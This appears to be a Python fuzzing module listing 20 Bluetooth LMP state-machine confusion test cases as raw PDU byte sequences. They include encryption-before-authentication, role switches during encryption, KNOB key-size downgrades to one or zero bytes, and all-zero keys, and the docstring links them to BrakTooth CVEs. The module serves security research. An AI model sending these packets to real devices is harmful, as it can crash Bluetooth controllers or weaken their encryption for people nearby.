"""LMP state machine confusion test cases for DarkFirmware fuzzing.

20 test cases ported from DarkFirmware's lmp_fuzzer.py. Each test sends
a sequence of LMP PDUs designed to trigger state machine bugs in the
target's Bluetooth controller — requesting encryption before authentication,
role switching during encryption setup, etc.

These tests found 24 CVEs in the BrakTooth disclosure (CVE-2021-28139 family).
"""

import os

STATE_CONFUSION_TESTS = [
    {
        "name": "enc_before_auth",
        "desc": "Encryption request before authentication",
        "packets": [bytes([0x0F, 0x01]), bytes([0x10, 0x10])],
        "severity": "high",
    },
    {
        "name": "setup_before_features",
        "desc": "Setup complete before feature exchange",
        "packets": [bytes([0x1D])],
        "severity": "medium",
    },
    {
        "name": "switch_during_enc",
        "desc": "Role switch during encryption setup",
        "packets": [bytes([0x0F, 0x01]), bytes([0x13, 0x00, 0x00, 0x00, 0x00])],
        "severity": "high",
    },
    {
        "name": "unsolicited_sres",
        "desc": "SRES without AU_RAND challenge",
        "packets": [bytes([0x0C, 0x00, 0x00, 0x00, 0x00])],
        "severity": "medium",
    },
    {
        "name": "rapid_feature_cycle",
        "desc": "Rapid features_req/setup_complete cycling",
        "packets": [bytes([0x27]), bytes([0x1D]), bytes([0x27]), bytes([0x1D])],
        "severity": "medium",
    },
    {
        "name": "key_size_after_start_enc",
        "desc": "Key size negotiation after encryption started",
        "packets": [
            bytes([0x11]) + bytes.fromhex("0123456789abcdef0123456789abcdef"),
            bytes([0x10, 0x01]),
        ],
        "severity": "high",
    },
    {
        "name": "ext_io_cap_truncated",
        "desc": "Extended IO capability with missing params",
        "packets": [bytes([0x7F, 0x0B])],
        "severity": "medium",
    },
    {
        "name": "ext_io_cap_unsolicited",
        "desc": "Unsolicited IO capability exchange",
        "packets": [bytes([0x7F, 0x0B, 0x03, 0x00, 0x00]), bytes([0x7F, 0x0C, 0x00, 0x00, 0x05])],
        "severity": "medium",
    },
    {
        "name": "detach_zero_reason",
        "desc": "Detach with zero reason code",
        "packets": [bytes([0x07, 0x00])],
        "severity": "low",
    },
    {
        "name": "stop_enc_without_start",
        "desc": "Stop encryption that was never started",
        "packets": [bytes([0x12])],
        "severity": "medium",
    },
    {
        "name": "double_features_res",
        "desc": "Send features response without request",
        "packets": [bytes([0x28, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])],
        "severity": "medium",
    },
    {
        "name": "oversized_name_res",
        "desc": "Name response with max fragment",
        "packets": [bytes([0x02, 0x00, 0x0E]) + b"A" * 14],
        "severity": "low",
    },
    {
        "name": "zero_opcode",
        "desc": "Reserved opcode 0x00",
        "packets": [bytes([0x00])],
        "severity": "medium",
    },
    {
        "name": "max_opcode",
        "desc": "Maximum single-byte opcode",
        "packets": [bytes([0x7E])],
        "severity": "low",
    },
    {
        "name": "escape_invalid_ext",
        "desc": "Escape with invalid extended opcode",
        "packets": [bytes([0x7F, 0xFF])],
        "severity": "medium",
    },
    {
        "name": "knob_min_key",
        "desc": "KNOB: request 1-byte key",
        "packets": [bytes([0x10, 0x01])],
        "severity": "high",
    },
    {
        "name": "knob_zero_key",
        "desc": "KNOB: request 0-byte key (invalid)",
        "packets": [bytes([0x10, 0x00])],
        "severity": "high",
    },
    {
        "name": "au_rand_all_zeros",
        "desc": "Authentication with zero random",
        "packets": [bytes([0x0B]) + b'\x00' * 16],
        "severity": "medium",
    },
    {
        "name": "in_rand_all_ff",
        "desc": "Initialization random all 0xFF",
        "packets": [bytes([0x08]) + b'\xFF' * 16],
        "severity": "medium",
    },
    {
        "name": "comb_key_zeros",
        "desc": "Combination key all zeros",
        "packets": [bytes([0x09]) + b'\x00' * 16],
        "severity": "medium",
    },
]
